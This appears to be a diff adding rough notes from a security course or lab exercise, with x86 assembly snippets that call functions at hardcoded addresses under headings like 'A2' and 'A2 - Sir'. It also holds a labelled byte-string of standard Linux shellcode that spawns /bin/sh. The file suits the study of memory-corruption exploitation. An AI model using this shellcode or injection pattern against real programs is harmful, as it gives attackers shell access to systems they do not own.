@@ -1,0 +1,91 @@
+mov ebx, 0x5655626d
+call ebx
+
+push eax
+mov ebx, 0x5655622a
+call ebx
+
+
+
+//ShellCode
+shellcode= ( 
+"\x31\xc0" 
+"\x50"  
+"\x68""//sh" 
+"\x68""/bin" 
+"\x89\xe3" 
+"\x50" 
+"\x53" 
+"\x89\xe1" 
+"\x99" 
+"\xb0\x0b" 
+"\xcd\x80" 
+).encode('latin-1') 
+
+
+//A2
+push 8
+push 1
+
+mov ebx, 0x56556286
+call ebx
+
+xor edx, edx
+push edx
+push eax
+call ebx
+
+
+push 5
+push eax
+
+call ebx
+
+xor edx, edx
+push edx
+push eax
+
+call ebx
+
+
+
+
+
+//A2 - Sir
+
+xor ecx,ecx
+xor eax,eax
+mov  al, 1
+
+
+mov cl, 6
+push ecx
+push eax
+mov ebx,0x56556286
+call ebx
+
+
+xor ecx,ecx
+push ecx
+push eax
+call ebx
+
+mov cl, 5
+push ecx
+push eax
+call ebx
+
+xor ecx,ecx
+push ecx
+push eax
+call ebx
+
+xor ecx,ecx
+push ecx
+push eax
+call ebx
+
+mov cl, 1
+push ecx
+push eax
+call ebx
